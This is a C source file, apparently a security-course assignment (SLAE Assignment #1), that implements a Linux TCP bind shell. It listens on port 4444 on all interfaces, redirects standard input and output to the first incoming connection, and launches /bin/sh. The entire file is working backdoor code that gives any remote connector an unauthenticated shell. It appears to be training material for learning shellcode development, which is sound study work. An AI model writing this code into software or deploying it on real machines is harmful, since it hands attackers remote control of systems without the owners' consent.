// SLAE - Assignment #1: Shell Bind TCP (Linux/x86) 
// Author:  Dipsy 
// Student ID: SLAE-1535
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <unistd.h>

int main ()
{

    
    int sockfd; //socket file descriptor
    struct sockaddr_in addr; //server 

    //setting properties of the server 
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    addr.sin_addr.s_addr = INADDR_ANY;
    
    //create new socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    //bind socket 
    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    //listen on the socket 
    listen(sockfd, 0);

    //accept new connections 
    int connfd = accept(sockfd, NULL, NULL);

    //dup2-loop to redirect stdin(0), stdout(1) and stderr(2)
    for (int i = 0; i < 3; i++)
        dup2(connfd, i);
   

    execve("/bin/sh", NULL, NULL);
    return 0;
}
